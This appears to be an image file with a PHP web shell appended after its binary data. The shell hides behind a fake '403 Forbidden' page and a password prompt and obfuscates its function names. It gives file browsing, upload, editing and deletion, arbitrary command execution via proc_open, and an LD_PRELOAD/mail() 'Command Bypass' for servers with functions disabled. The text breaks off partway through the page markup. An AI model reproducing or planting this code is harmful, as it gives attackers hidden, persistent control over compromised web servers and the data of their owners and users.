[Ý®šÀdþ®fG txsÞCXßw…ž~FœÂ3‘Â[È-&¥ÍØdB1ÛÝ)1tìò÷q÷qä¦sÇå»'å9óãŒn½•ž` ·!@NÈºØÅL..h Œp´w‰}178®3ô;e½ä‹NFHiì©}ijŽ¾Ð–ó¸?#…kÑ+Ó\ØiÃ“ezµÓ>}1³€7Q{avçžÊíl§Š&5­ÛnË“#Ùèc¦/EitMàï”ý´ ²Z
EÎÉB\NÁ¶ÍÆ¦2ÜãÊµ‘Ë†à)gE!ÐT]É­™†·'~
Gd?
ƒ,ÂýÔôt37TMwžð?âÝ÷úœ-²! ´ï…Tðú‡Î«®¼JÌäù“Øq÷W2”¼•ß~§•ž]¤#98Î“BÙÛ¡ÙÇØö)HbË†Î'Q‰@ÜãetŽz= ŽI³Àóú‡Çº}$ý9dÜE‚*˜â&ˆÐëÚ«Iã‡Ý*?/~êû]Ì8–*‰ƒ^ÃìG9WI¿
·E”0¶]
põƒšöMÇXÜ?ÞÐ¹’3¯¨ê^vÑ^óý±ýW±þ"<=¬gæ­FïXÂ2_ô¹Q(J> ¥eŸ¬­Ï•ôõìnC•'Ó²ªÜåYpÃvÀÏÊÁž:ôÅâ£ý2-âqUéu6€ßœ•s©š¾®:FgïÛ*Œ´Uú~‘Õ•f¡ç#VÊÚt´hiÈM,ÔM¡£n Œ%uüo…ž’	Âqƒˆô‚l÷ {§ŒÝC&‡‘8 }!8ÈìÃû¦¹Ü’Í$€FTeVäÍ9ì Ïší[g»0´çê«PtÈàU$>hónM„êcá%Jì€ßDñ­ÉÆNvBRØs{ð§¨ËKý¨(Æ4‘€¦­äihùGáda{·ÅYFæKp##!s§‰ÞY.IééÝM/«@í'ƒ²ê)"/…ÍÏ!kþªµ²XÉ1‚wì§Ü]•š´qÓ:OÄœ©dVÎ£¯m(~@eOb®q^üU¡¤l”apai.Òwÿ ñÊØw4m«1¶&Ù9ŠÍÔØt#<áv¼Ý½9”#<'ë¯eA`¬ê†ÔÐÊâê†ºƒå4íñ±]5%T’+V öÂÖ~ô¤GOÔnˆ´Ô“<7>¢>¤cì¶P‘¯»5Û®l’ìôtE4Œ‹äkñ«
B'y‘àŒaFÄ\à¹>‰áÍ ÊÈ²1©Œ@h%W.ô¥àŒdåZ¥Òßuqƒ,:F\PŸ²“fˆpÁJÑ<d
ÓKŒ'eÄä•$¯g}—6E³·‹-;ÉôQ8‚%<øÈ*jŠf–“¾@Xc™€deÇ€«ETÚzI$Öý‡É*r¾¡íiipê«P4Þºª’ÚA|Pæ¢_l7ë…|q¶e9u——·ÿ ¦X©©Ë°Ì¼çùŽçú©Á/Øly¨qŠ= R4däžWjÑä7nÇq´ÉgÊÐÝÊIÎ‘Œp°˜€0Aú«"Û,Îxsp
æÄ?áÞ«zÕan¦.&5µy“H4c8ùú.˜Û£Ýµ¶º•ðÕ`±ã,ÏÝŠ¼g(n&rŠ~œ«Ò_†ËºFKUG!½×•¹-V5ŽQQÑÆÖ5¸œ1ZÑH÷FCZàK\ÐxM c¥‘Î#`3¹TžIMþÌ•C¶ÓGª…$m~6ÀÂiÓçÔÌêÙ[úñŒŽÁ+Ô/–²¢*}Eb¶SÇCGŒ²Îí—ª©•±³Ê`ÆŸè±§n£—{&åÚÜG!<‰º[°Ý„±ñ±;û§P±ÆÜ¦ÎõI¹á;`”þ.Àì°kÀÂðœgá é0q¨¡o|€íî©u­õ“¨-‹xŒ~žë—  ©NÍ$†´d’6Î;©8A-È
&ÞYÁà)Šp4“ƒÇ*IF`†»çáHÛ^	Ò9*4‚2FÛk°à«"K+@,ÿ º¼ÒyÁ~ÜSoYN$ïÆÊ±ô~ý@æTiÛ8Êua ŠŒ`;$~‘ÝXz‚ÚÇ9å£;o²[¡h)¤£­«/ÍC%òH#ô·H;}JÖÊõ¶XâlpÒ6Š™‡Ëˆ Ï¢Y®FØÜ7XSg:06ïîžGZCÜî¡º#Æ„¼c³ïÊËÒF^4“ž=ÔYaÄ»`‘ÊB]%¸#”¸--Á<¤¤¤däÊlËÅ ‘¥à\†]pw;í…~žŸÍÀõ*§PÚßAPÙ[´r¿ÊË"Õ›a•J…(\Ù1¹8øåOS–·að ­¼1¯ÏÊ—kžÖ’Ó¾#g¡þn2-Ä´çÙ'áÝ¿TU—·Œ:¦cm
8Èúœ¨î£ªq¥‚‚@«¹JÚxš² 9ÿ a•v·ÒÁj¶Ao§d-Lr·Á¶qò§JŒ§q’MÇ	Å3H-È?Ñ%A:ÜRÁÎÒßEÒp¼2
I£gú¬òâ×{ë"Ôs	þY®pqÛ¾ION\Æ°Ø¤šÝ·Ü,d~9ek'SØåtê·S£Ãdoý>ê¯-Tt’\r[î­O}ü•¹ÔÑËëœà4ŸåîµÃ§–íZ Œ#õ~ê’d¢ZÇHê™T­qÈ8SUÓˆÚ#ÕÀÁÆË:*ÊS‚nTUUA|§‡o¾ê«CÖ:£Œ?ÉR-v‘Œç)µt³S€ý“—´ƒB‘va%ää”õŒÆäöM¡P ”ñ¬*—'¾2™¹Àœ’ÎXÓ¶Ç
=Î«öRGÙ`¸±Æ' ÜáRï4äj{w8W¹fˆžC†UZóO–8¹U^š²™’×ïî¦hå/Œ²‰©DÛ„þÝ'§KŽ Z‹ï‚vKÑ7î’n4áÜ{û¥`
c óž^Ë–y2Ñ„¤­.&”²às¶Éã$ÔG¤ûªøµ#ž@#U‹}L½5v}k²ê9ÈmHÇéöxúe|¯„87lw
µ[F×—Æøò×#•dÁckc~™á{_€=®{¥ƒÚe\éŠÙiuôõK‰kAu#Éå¼–çáXY6nêYV…Z+¨i$w&h;$K_°ÙEÀüì{%ßpå#Æ²}ˆÀáM³à-`/ú¨ëÍ®¥sÝÛ¸S%§$ŒŒÒnŒ<‘ŒeµAJ•jZvÂÆ´Ž
ÆçS›Q=´·wð9û§Gº‘²¬gÛ =Ê¯>¶Zˆßqpž±ÁºL¾äü{/9§tz*v»
ôµ¾[ŸT:ïX3ù8ô€ y°þê÷)¾Ê»Ñ´Ï‚Ø*åš¥ÆG}ÿ ý+¤pn2½G¬O7$»HVó–ìžDÖ– ÈXµ˜`ie‘1±ç¸V3òÙ¬’pxY†µŸ§8C˜Ð	Ün¼Òç;þ”àµûpJoZb¤…õ2½¬.sœvÀJhs3¶O¸Tþ»»8Ó+—Ï‡È=˜;}Ê7DYOºWOy¬¨¸’âÉ˜Yÿ ?~TMZ‹^[¹;’šÑRºWåØ+U,_”Ÿù•—J†×Z¦Ã#ô¨j<åÄ”¸Ìe—Iqý”®•Ìˆ$îYC¸Ééáf	s±§;¥IÇÜ%«_¹Ç
ÖB<ct–çd¸Æœ“‚e§XáfàC£ÇuTXmY¤‘¶Ê‹~­\á:®—Æ²rK«b#/q-$Ù\¯¥ÖMVØÇ§è¢nðl9þŠi™)ÁƒìTmÅ¢_á‘ênr?Êª5(ñi‘ÛŒ¬(ä-?«nêBñNá.@ã•Ðr]ß+C?	ÈdÔÑ¤lœÂN\'5Ñûã•+@-<ƒÂ¡¢Dç5„“Ç	Õ,áÚA$‘”Ú@-ý–óÞßNU2æ‡‚û’¢«iœ\=¸R0Ïæd^q*AY­¢‘ÍÕœÉc:˜ð7iRöë‹î0Lß.¢ <Öð>£öIÔG¹-;o²bðø%mM>D­Øãù‡±Z&='Ã€n	å`é 9”Þ:¨ê©Dð<aùwrOœCu)*IÑ‡I¸íÊ—†2Ö‡œ¦”æ6gÙJFÐ[œŒ 1|M{FBIÌ#nB}ål02°’0ÐN¦°Aw0yÒHØØröõÇ*µÔÍŽ7QY©ð?1 ikFÚ+aUÁæBý$j Ÿu¬è¦7>¯žGgM#n}óºÉã]¬¼rµ.ôˆ¡lL à ŸCé9vÉ8XÂ51î–i#>û-LGð`W¯K2uôM£”´ã²vÁ¬d}Y€‹“žû¬ÚÂrG,ÖÆpÓ±þé:² nu¹ÏG¤mòõš†ZÊ£†´zp?QìÕ‘ÔV^+]Xs,ÇVÇ:G`³ê~ wT^ŒtÒo¢~†údrå%i·µ ¿•Iº&({i¢h{_§c²ssœGaiÇ)å<>K`À”%|¢J€4ç9îª¶\mINjªCH$7|+§®·ŸàÚhŸ9a‹vkGÉìŸøgÐñõ	š¶®BÊjwµŽk\Ž;éo¶ÝÖí·tõ
®—ò”Œ¥§Q‰„úîãÉ+,œŒxåÑ¿Ú®‹(9lÔOðã¨áïŠžSŒ˜ã®~>Ô4´/¤qŠhÝŒv×lGÙtmtnkH§Œ9®'aƒÀP]OÑvëãDÓ—ÅPÝ™3@'áÞásq¹øùsz¦×ú/<c!Ù#·d…\º .Ü)Ûíš¶Å\ê:¶çþ´zdãþÊµZ3ú‡ðZH#?¬ÿ Ùw#BTºZ·j.{"Û9ÿ öÐ4
1FÖ4pÖ’óãùóÆvI±ôW »Òú©˜=ÂŽ»S¶x¿ÝŒíò;‚¤­áÎ§
È8X×ÄtnÞUQ«e*å*b34ÁÔ=±U× ×j¹0Âç2;àö*»YŽB7Z{Û€ÀÕÉ<)èƒIaÀú(p-ÁùSÔ ¸dn«"W‚Ó°–c
=îsdÒÓÁÂ”iiÝFÏI-#mÁÂ¢D’6éðÖ»tê¬`lÜä¨ÛdºeÜåJNrÞ3”t® ŸNøã	»Ù‚pqŸ„îFàãÙ$XàH;n¥²2Ig¶Ljbð?fãp?ä’Õ5-dðÈ×5Û‡SQ¶@àwÏ*5ÕÓôeH‘±:[dî—l˜ü‡Çº² ØµšvÊpÂqÊŠ·×Ar¦ee$ñËÆXö‡‚¤c{03¬mp{t~É7´gKŠÊ, Éî²‘ ŒÉBFof‡sÆU)öhí·ú™ `
¨"W}wÊ½HÐü4Â…½Âc
Ÿ ‘±Û|!›0…Ãf´Œ”äÉ°'Ø{(ès¤e+LÆiË¹B,ò øÜ†GÊ|Æàja8ÂM±µÃSr^GRØ‰2å£Ü¡6;7Fr>«Wø—×S:sÒ69ƒ¤•„ÖÌÇdÂÏøçþGú(Ÿü`Ž:ÇôßF5•µïŽYØIe1Î7Ç.øì¡º;¤e…ž}Asžò_,Žåî<£×¤%dßMÙ™LsX
åGJÐÀçPãe…cFÚF=Óóˆ˜I&ìÑhiY#Yh~ãåERSyó“°ê¨ù¯ÏºsAŒ»´¨±eÃÁÎ¦‚ÛÔuÝ5ZàßÍˆêéNh-sG¹ÀªÞ¥âVºV<OeËél¬š¶Èè¥§x|R3g1ÀìAú­•eñvçm„CÔ7Ui5Deß%Ž#¡_/ÿ  ø^G?úÜ,gTÿ †ŽÞ'"µ‘Z6ÓLáw˜Â5cvÿ EíK‘é-Ã»`p¨Tž2ô¬Ï`­Ž¾ÛêÔÓ3íè'ËßŒÝ%OLöZjæ¼Tú!¥‰íÏÿ '¸ ÑïÝ|§þ7ó¼u.<ZPŸ®î¿ùþNùòøÒý¾Ñ]ñŠXüÛ]²	¿ŒçK#š¨GÆvãu®.%ŒkÝƒF“¬®ª¼Üªº‚àXÚš³$¶&ÒÆç°¾ê
®@O ýWê1þQÅí$¿ÑâN]åcg¿br1Ânç–i;ò”{r“Ù%ê-Ê´_íA¾QJVFÓ99XÛ±ä?	ÄÍ%‡HìªJ•Þ—ÌdÐH#ª¤…Îc›&Kã:IïðUÚé˜p$þÿ 
ŸY‚¯XÜKéw°=•Ñ@£%®?º›£ÉØ¨˜ƒš -ÝKP‡’Ü…%x?‘ƒËÁî7*>v{aIJA‹l&rÇ¨6Îê¨–6¤ÖÉAaÁÏ²–wªN'”Â’šL±ÙÏº—e? 5Ý”™cqpÙÄŸeœtÄ½ÎÒp¤M;F6çÖNŒ7 4mò„
šÆ°zF6IWÒE[Lè&n1Œ§˜¨4$Þ	Ð6Sd’á}ê/
n~u.¬²=ÞeE6œ¾0y|gü-±ÒqÓÝaBÚ»-|sòÌáì>Å¼…ÔV*{Åã’&†$Œ­%UÒ—+ø\úzi)&ÈÖ"~œþËX®È­Ó:²75€8‘ïÊÏÍÔv…§­^#_í”Q¾ý©c@•€ýÇun°xƒÓWüŠ;”fQú£~Záö(ÑbÚð×í\qò™Üa”¯°dtµ‘N=/Û ¥¤®Ë	É#|%ezÚÑ( ò8=k]ñœî«W;½%‰óT×VÅKEÎ.‘á£uBê*k uBP>¢b1ùÚ–Âß} îãö	E,Ú½AÕý?ÒTn¸_n°QÀÑ»¤v2}€äŸ€´Xø»Ö#UIdèø&·Z†ZjÓLÓõýuHuWV¶çÕ·JŠÙI.Õ3±>ÎØ=?Ò´4Q©)ÃI. eÇåŒvJ¶Ft‡ÔvZ@çF|ç^ã¹>ëfPP†·¸ØYÑP6µ¥ 'AŸ¤¬›ìj•FÂœàŽ’9±8g#„åÏ,öL^KÜC¿e62l.q¾øRÆæ`7;Ž‘DžBÀÝÈ(h…èŒÄzN~R®#dñ•ë^8
ÂõÇ' òK‰“––ÇpR7øQ:ÈÎd«ÁkO îxÕ>yÀÙMƒ^[ÀPud¹Ã
Z¹äFxPr¿YÙZ$}žÜg%`Nû®ZôIÎäý•›¢/öà[ œ—kiÂgFìBè¤¤c²„jÈ;Œ[¼’vU[½8|n î7Uq¹±ÏÂ®W@÷4á •b¬…šØ×‚@î¤(L{F@öÝ3¦„š‡Ã‡e§8ú©Úsžàâpº­ÿ $X „<n7÷ÊÏòŒh:ÎØO[ZÖ´”œÐ As¸eK!q´	È
;äå%xØ –-ç }p–2	,ÝQËÌnºÉñáç|)°$#-å`ø°Ý@íÝ,G$£bÂ1ßÝH–öåTºŽÉ–:ÈÃ€þêæcÀ6©…ŽaiŒ8gux²(«Ò[éê©LSÄ×ê*‘]ÒQÝÄ”àÆ%'g–Æ©–J)5%¹òÉ ËN ÖõUÛ»/Ï­¦¥q]ê
ayÆ}Î?²½’@IQÕ¶ÖyV{­Tr³ôeÌã¸)í§Æ.¹éª]}ohŠáæ¥ikÄg—ñð³ë®§£¢¤¦‚ßY[è‹X8s½¸çnVÔÔýca¨eÚŠ•qú&‰®tn9 ;ÛŒ¨íº#¨÷¯:rÕÕ5”7Ê€ù!ž0èØ×ÿ ƒ¸:x÷Ý#KgµÛâ
fçùA÷ÿ 	µ–¬Åo¸ô«w}®Hæˆ¸çÈ5 =°I²“·R	ß1ÚˆÜ£vŒšÙ”TŽ–BCpØì¬ö‹v–€Y¸“z*V€Ò@#9ãub§ˆ4 00vY³Hª0e0>“²S
‡Ýg¾N3Œ ´¸ì¢‚ÃyY¤dœåaÇS»§‚ºÉ±c“„¢­[³ZtƒÆa­.çl©cFGÙaÚ<l¡“F1µ˜'ØC´êõ}–LißcÊÅÍùùîUI™ÃÊnÒ3©ÃåeRI$öX· d7¿Ñ²6å $°gÙE9¸~)Ýt¥Òò9Ç²bÇj“×²¼@¡#Òlf[úR¤‚	i^´a£…fC.ôƒÑ¾Ûl´·}HIfÛ€œ°» @P˜Öµ„°“Øñ…ú0çdåOT îFALdkC¶Ê4B6˜E_üÍÎÿ U3{z}”|¢°—gI*Fâ26Tcè÷#uŒÃ
àçè²-y#l“”	ÈáAönýÒãÜxHBOÿ ´»3ìsò€Ì7Kš1û¯K²ZN Ñ€~«[œçî¥3œð° ŽË6€s·r±'|÷V¬œÅÑãÔZ³­9+'9 à‚²”v¡–i™<f©­¹§È$äeO¿¾×f¬¡êl¨t´™k¼É%;;bqÁ+hFí-­#<&wS‡·bSt
OTÛmmÓóQ˜é$¨kqPÖK7ô’vÎU~Ž†ÃÑ”5Ö–DÃ/®¢} jÀÆ§cáNÜú^´9‚×9œ9… ƒôÊJ/
!¯ß+$¨È…¬`ú€7Qe­QÒ;[X.péœÚZÚ"Ö7Œµ€é?åItíCgkZNr9Â¹>ÚÛoGUÛ``lPÓ9ŒiöÁT^–ÍpŒãÓÂ½hÇì¾[`Á¥½›Æ¼Qï·Mm1iŽvÄe"Üdo²©"$sŒ
ø^|
²•|qœáýý—˜kHß=”QpÆíÂ¨ïºðŒ°áÃ#áßÌ0@ÎM@dpV'.hÃ·JË€À3ý­ B‡°bÀ—
·HLCIîŒ‘¸á!3ðíð«@c)ÓvÛ±ú¤j¤Æ\}±••iÜîé ûd&Wy´C§#SElˆ¨“\˜|¬C;ŠÃ9~¬c	VäÊ„@¤m:N[±<¬ö´àÞé@ìÆHÇl&U4<Ê¹+ü›YôÙ;o?t!"ny/)œÝþˆB2„\Ÿý{?ûe?ƒôý…F@ çì›Oú…3Øÿ ÂU¿©@zïÖÕˆý?t!J%x9û!
ÀÊ/ð‰?ÜoÑ@*ßåúÝc?éû!öÿ ¼ðÿ ¸ô!X€¾ÿ üwÿ ißÙkÛûƒéþ…¢‹Ób[¿Ø‹ÿ Šxxû!
ˆ“.ÿ ²Äþ¯¸B–G§ºÀs÷BY"³¶Ô›Hú¡
ç¿Ñ7•@G×óÕFÞ?Qúì„!DE3ýÂ–öB/Ib‡ý¢¡jÿ Þ?D!]gÿÙ<?php
$password = "Bebekpanggangsunkitchen69%$"; // passwod
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);
$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "
<html><head>
<title>403 Forbidden</title>
</head>
<body><h1>Forbidden</h1>
<p>You don't have permission to access this page on this server.</p>
<hr>
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
<style>
input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<center>
</body>
<pre align=center><font>
</font><form method=post> <input type='password' name='pass'></form></pre>";
        exit;        
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>~</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="noindex, nofollow, noarchive">
    <link href="https://fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet">
    <style>
    body {
        font-family: 'Inconsolata', sans-serif;
        color: #000;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }

    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font-family: 'Inconsolata', sans-serif;
        color: #333;
    }

    .result-box::placeholder {
        color: #999;
    }

    .result-box:focus {
        outline: none;
        border-color: #000000;
    }

    .result-box::-webkit-scrollbar {
        width: 8px;
    }

    .result-box::-webkit-scrollbar-thumb {
        background-color: #000000;
        border-radius: 4px;
    }
    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #ffffff;
        border-radius: 44px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #000;
        border-radius: 3px;
        box-sizing: border-box;
        
    }
    form input[type="submit"] {

        padding: 10px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    form input[type="file"] {
        padding: 7px;
        background-color: #000000;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    .result-box {
            width: 100%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Inconsolata';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
    form input[type="submit"]:hover {
        background-color: #393939;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #5c5c5c;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #0db202;
    }
    .not-writable {
        color: #d60909;
    }
textarea[name="file_content"] {
            width: calc(100.9% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 500px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Inconsolata';
        }
</style>
</head>
<body>
<div class="container">
<?php

$chd = "c"."h"."d"."i"."r";
$expl = "e"."x"."p"."l"."o"."d"."e";
$scd = "s"."c"."a"."n"."d"."i"."r";
$ril = "r"."e"."a"."l"."p"."a"."t"."h";
$st = "s"."t"."a"."t";
$isdir = "i"."s"."_"."d"."i"."r";
$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
$bs = "b"."a"."s"."e"."n"."a"."m"."e";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$drnmm = "d"."i"."r"."n"."a"."m"."e";
$unl = "u"."n"."l"."i"."n"."k";
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER[hex2bin('444F43554D454E545F524F4F54')]);
$scriptDirectory = $drnmm(__FILE__);

function x($b) {

    $be = "ba"."se"."64"."_"."en"."co"."de";
    return $be($b);
}

function y($b) {
    $bd = "ba"."se"."64"."_"."de"."co"."de";
    return $bd($b);
}
echo "Kernel: ".(function_exists('php_uname')?php_uname():'???') . "<br>";
echo "Zona waktu server: " . $timezone . " - " . date('Y-m-d H:i:s') . "<br>";
echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV! ]</font><br>";
if (function_exists('mail')) {
    echo "<font color='black'>[ Function mail() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function mail() ] :<font color='red'> [ OFF ]</font><br>";
}
if (function_exists('putenv')) {
    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
}
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
$chd($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
        } else {
            echo "<hr>Sorry, there was an error uploading your file.<hr>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        $newFolder = $currentDirectory . '/' . $ff;
        if (!file_exists($newfolder)) {
            if ($mek($newFolder) !== false) {
                echo '<hr>Folder created successfully!';
            }else{
                echo '<hr>Error: Failed to create folder!';
            }
        }

    } elseif (isset($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if ($fpc($newFile, '') !== false) {
                echo '<hr>File created successfully!' . $fileName .' ';
                $fileToView = $newFile;
                if (file_exists($fileToView)) {
                    $fileContent = $fgc($fileToView);
                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
                    <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                    <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <input type="submit" value=" Save "></form></td>';
                } else {
                    $viewCommandResult = '<hr><p>Error: File not found!</p>';
                }
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        }else{
            echo '<hr>Error: File Already Exists!';
        }
    } elseif (isset($_POST['cmd_input'])){
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $drnm = "d"."i"."r"."n"."a"."m"."e";
        $currentFilePath = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentFilePath);
        $full = $doc . $directoryPath;
        $cmdd = $_POST['cmd_input'];
        $meterpreter = $en($cmdd." > test.txt");
        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By HaxorSecurity</font><br><br></textarea>';        
        $a($full . '/chankro.so', $base($hook));
        $a($full . '/acpid.socket', $base($meterpreter));
        $p('CHANKRO=' . $full . '/acpid.socket');
        $p('LD_PRELOAD=' . $full . '/chankro.so');
        $m('a','a','a','a');
    }elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if ($unl($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    }elseif (isset($_POST['cmd_biasa'])) {
            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
            $pc = "f"."c"."l"."o"."s"."e";
            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
            $command = $_POST['cmd_biasa'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = $pp($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = $stg($pipes[1]);
                $errors = $stg($pipes[2]);
                $pc($pipes[1]);
                $pc($pipes[2]);
                $ppc($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
                } else {
                    $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
                }
            } else {
                $viewCommandResult = 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
            }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = $fgc($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p>
            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
            <input type="submit" value=" Save "></form></td>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }  elseif (isset($_POST['edit_file'])) {
        $ef = $currentDirectory . '/' . $_POST['edit_file'];
        $newContent = $_POST['content'];
        if ($fpc($ef, $newContent) !== false) {
            echo '<hr>File Edited successfully! ' . $_POST['edit_file'].'<hr>';
        } else {
            echo '<hr>Error: Failed Edit File! ' . $_POST['edit_file'].'<hr>';

        }
    }

}

echo '<hr>DIR: ';

$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$homeLinkPrinted = false;
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}

echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
echo '<br>';
echo '<hr><form method="post" enctype="multipart/form-data">';
echo '<hr>';
echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form><hr>';
echo '<table border="5"><tbody>
<tr>
<td>
<center>Command Bypass<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>

<td><center>Command Biasa<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>

